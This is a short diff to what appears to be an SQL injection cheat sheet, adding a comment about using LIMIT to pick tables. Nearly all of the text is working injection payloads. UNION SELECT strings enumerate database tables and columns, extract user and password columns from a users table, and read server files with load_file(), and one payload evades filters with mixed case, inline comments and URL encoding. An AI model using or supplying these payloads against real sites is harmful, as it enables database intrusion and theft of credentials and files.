@@ -28,7 +28,7 @@ UNION SELECT column_name,2 FROM information_schema.columns WHERE table_name = 'u
 Selecting data from table:
 UNION SELECT 1,[column name] FROM [table name] /*
 UNION SELECT user, password FROM users /*
-1'+uNioN/**/sEleCt/**/table_name,2+fRom+information_schema.tables+limit+0,1%23&Submit=Submit#
+1'+uNioN/**/sEleCt/**/table_name,2+fRom+information_schema.tables+limit+0,1%23&Submit=Submit# /* using limit with can select the tables we want
 
 Reading files:
 UNION SELECT 1,load_file('file location') /*
